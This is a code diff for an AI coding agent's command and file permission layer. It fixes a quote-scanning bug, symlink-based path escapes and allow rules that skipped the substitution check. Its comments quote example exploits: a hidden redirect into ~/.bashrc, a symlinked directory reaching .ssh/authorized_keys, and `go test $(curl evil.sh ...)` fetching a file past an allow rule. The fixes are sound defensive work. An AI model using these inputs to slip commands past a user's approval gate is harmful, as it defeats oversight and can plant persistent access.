@@ -132,7 +132,13 @@ func escapes(segment string) bool {
 	for i := 0; i < len(segment); i++ {
 		switch c := segment[i]; c {
 		case '\\':
-			i++
+			// sh takes backslash literally inside single quotes, so consuming
+			// the next byte there desynced the scanner: 'x\' hid the closing
+			// quote and everything after it read as quoted, so the redirect in
+			// `echo 'x\' > ~/.bashrc` went unnoticed.
+			if !inSingle {
+				i++
+			}
 		case '\'':
 			if !inDouble {
 				inSingle = !inSingle
@@ -362,6 +368,12 @@ func (e *Executor) Tools() []provider.ToolDef {
 	}
 }
 
+// resolve turns a tool argument into the absolute path the call will actually
+// touch. Symlinks are followed, because every boundary check downstream —
+// inWorkArea, sensitivePath, the write gate — compares strings: a link
+// committed to a repository (git stores them) named docs -> /home/you made
+// write_file("docs/.ssh/authorized_keys") look like an in-tree edit and auto
+// mode approved it without asking.
 func (e *Executor) resolve(path string) string {
 	if strings.HasPrefix(path, "~/") {
 		if home, err := os.UserHomeDir(); err == nil {
@@ -371,7 +383,26 @@ func (e *Executor) resolve(path string) string {
 	if !filepath.IsAbs(path) {
 		path = filepath.Join(e.Cwd(), path)
 	}
-	return filepath.Clean(path)
+	return realPath(filepath.Clean(path))
+}
+
+// realPath resolves symlinks as far as the path exists. A file being created
+// does not exist yet, so the deepest existing parent is resolved instead and
+// the remainder appended — writing a new file through a symlinked directory
+// still lands where the link points, and the check has to see that.
+func realPath(clean string) string {
+	rest := ""
+	for dir := clean; ; {
+		if real, err := filepath.EvalSymlinks(dir); err == nil {
+			return filepath.Join(real, rest)
+		}
+		parent := filepath.Dir(dir)
+		if parent == dir {
+			return clean // nothing along the path exists; lexical form is all there is
+		}
+		rest = filepath.Join(filepath.Base(dir), rest)
+		dir = parent
+	}
 }
 
 // argPath pulls the "path" argument out of a tool call, or "" when there is
@@ -508,7 +539,15 @@ func (e *Executor) CallDetailed(ctx context.Context, name string, raw json.RawMe
 				}
 				for i, seg := range segs {
 					if acts[i] != RuleAsk {
-						if acts[i] == RuleAllow || blanket || !needAsk {
+						// An allow rule is a standing grant and gets exactly
+						// what an answered one gets: not in plan mode, and not
+						// for a segment carrying a substitution or a redirect.
+						// Skipping escapes() here let allow = ["bash(go test*)"]
+						// run `go test $(curl evil.sh -o /tmp/p)` unprompted.
+						if acts[i] == RuleAllow && grantsApply && !escapes(seg) {
+							continue
+						}
+						if blanket || !needAsk {
 							continue
 						}
 						if grantsApply && e.segmentAllowed(seg) {
